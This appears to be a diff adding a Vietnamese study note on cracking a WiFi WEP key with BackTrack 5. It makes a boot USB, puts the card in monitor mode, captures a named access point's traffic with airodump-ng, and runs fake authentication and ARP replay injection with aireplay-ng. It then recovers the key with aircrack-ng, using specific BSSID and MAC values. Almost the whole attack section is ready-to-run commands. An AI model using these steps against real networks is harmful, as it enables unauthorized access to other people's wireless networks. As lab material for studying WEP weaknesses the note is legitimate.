@@ -1,0 +1,95 @@
+﻿
+I. Su dung backtrack 5
+
+- Download chuong trinh "Universal Boot USB" va co file BT5R3.ISO
+ 	+ Format USB theo dinh dang FAT32
+	+ Su dung Universal tao USB boot theo wizard
+
+
+- Neu nhu su dung VMWare "khong de Window nhan card Wifi USB"
+
+
+
+II. Crack Wireless WEP KEY
+
+1. Kiem tra cac thong so phan cung 
+
+root@bt ~# lspci
+ => kiem tra cac giao tiep PCI
+
+
+root@bt ~# lsusb
+ => kiem tra cac giao tiep USB
+
+
+root@bt ~# ifconfig -a
+ => co card mang wlan0
+
+
+root@bt ~# iwconfig 
+ => co card mang wifi wlan0
+
+
+2. Chuyen card tu Manage mode --> Monitor mode
+
+- Card wifi co 2 mode hoat dong:
+	+ Manage: chi su dung binh thuong
+	+ Monitor: su dung de capture traffic wifi
+
+- Chuyen card wifi sang monitor mode
+ + Cach 1: airmon-ng
+
+root@bt ~# airmon-ng
+ => liet ke cac card wifi va chipset cua card
+
+root@bt ~# airmon-ng start wlan0
+ => chuyen card wlan0 sang hoat dong o monitor mode
+ => (monitor mode enable on mon0)
+
+ + Cach 2: su dung iwconfig
+
+root@bt ~# ifconfig wlan0 down
+root@bt ~# iwconfig wlan0 mode monitor
+root@bt ~# iwconfig wlan0 up
+
+3. Scan cac AP xung quanh "airodump-ng"
+
+- Scan AP xung quanh
+
+root@bt ~# airodump-ng mon0
+ => xac dinh cac thong so 
+BSSID: 00:21:29:76:20:88
+ESSID: dinhmh
+Channel: 11
+Mac_address_wifi: 00:1d:73:37:8f:ae  ( ifconfig wlan0 )
+
+- Thuc hien capture traffic cua 1 Access_point xac dinh
+
+root@bt ~# airodump-ng -c 11 -b 00:21:29:76:20:88 -w /root/Desktop/wep mon0
+ -c: channel cua AP
+ -b: mac_address cua AP
+ -w: write, ghi traffic thanh file o vi tri /root/Desktop
+
+
+4. Thuc hien Fake Authentication
+
+root@bt ~# aireplay-ng -1 0 -a 00:21:29:76:20:88 -h 00:1d:73:37:8f:ae mon0
+ 	-1: fake authentication
+	-a: mac address Access Point
+	-h: mac card wifi
+
+5. ARP Relay Injection attack
+
+- Attacker su dung frame xac thuc cua Client hop le va injection vao Access-Point
+
+root@bt ~# aireplay-ng -3 -x 300 -b 00:21:29:76:20:88 -h 00:1d:73:37:8f:ae mon0
+	-3: ARP relay injection attack
+	-x: xac dinh luu luong la packet per second
+	-b: mac cua AP
+	-h: mac cua card wifi
+
+
+6. Crack wireless wep key
+
+root@bt ~# aircrack-ng -z -b 00:21:29:76:20:88 /root/Desktop/wep-01.cap
+ 	-z: vua capture va vua crack
